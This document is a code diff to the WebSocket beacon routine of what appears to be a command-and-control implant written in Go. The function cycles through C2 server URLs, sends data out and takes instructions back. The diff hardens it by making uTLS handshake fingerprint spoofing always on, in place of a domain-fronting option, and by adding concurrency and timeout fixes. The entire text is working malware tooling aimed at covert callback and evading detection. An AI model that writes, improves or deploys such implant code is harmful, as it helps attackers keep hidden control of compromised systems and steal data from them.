@@ -14,10 +14,11 @@ import (
 )
 
 func sendWSSBeacon(body []byte) []byte {
-	startIdx := currentC2Idx
-	for i := 0; i < len(C2URLs); i++ {
-		idx := (startIdx + i) % len(C2URLs)
-		c2URL := C2URLs[idx]
+	startIdx := int(currentC2Idx.Load())
+	urls := c2URLsSnapshot()
+	for i := 0; i < len(urls); i++ {
+		idx := (startIdx + i) % len(urls)
+		c2URL := urls[idx]
 
 		beaconURI := getActiveBeaconURI()
 		if ContentLengthJitter > 0 {
@@ -33,16 +34,9 @@ func sendWSSBeacon(body []byte) []byte {
 		}
 
 		var dialer *websocket.Dialer
-		if chameleonEnabled {
-			dialer = &websocket.Dialer{
-				HandshakeTimeout: 10 * time.Second,
-				NetDialContext:   utlsDialContext,
-			}
-		} else {
-			dialer = &websocket.Dialer{
-				HandshakeTimeout: 10 * time.Second,
-				TLSClientConfig:  newAgentTLSConfig(DomainFront),
-			}
+		dialer = &websocket.Dialer{
+			HandshakeTimeout: 10 * time.Second,
+			NetDialContext:   utlsDialContext,
 		}
 
 		header := http.Header{}
@@ -65,6 +59,7 @@ func sendWSSBeacon(body []byte) []byte {
 			continue
 		}
 
+		conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
 		err = conn.WriteMessage(websocket.TextMessage, body)
 		if err != nil {
 			if Debug {
@@ -84,7 +79,7 @@ func sendWSSBeacon(body []byte) []byte {
 			continue
 		}
 
-		currentC2Idx = idx
+		currentC2Idx.Store(int32(idx))
 		if Debug {
 			fmt.Printf("[+] WS Beacon OK from %s, response %d bytes\n", wsURL, len(resp))
 		}
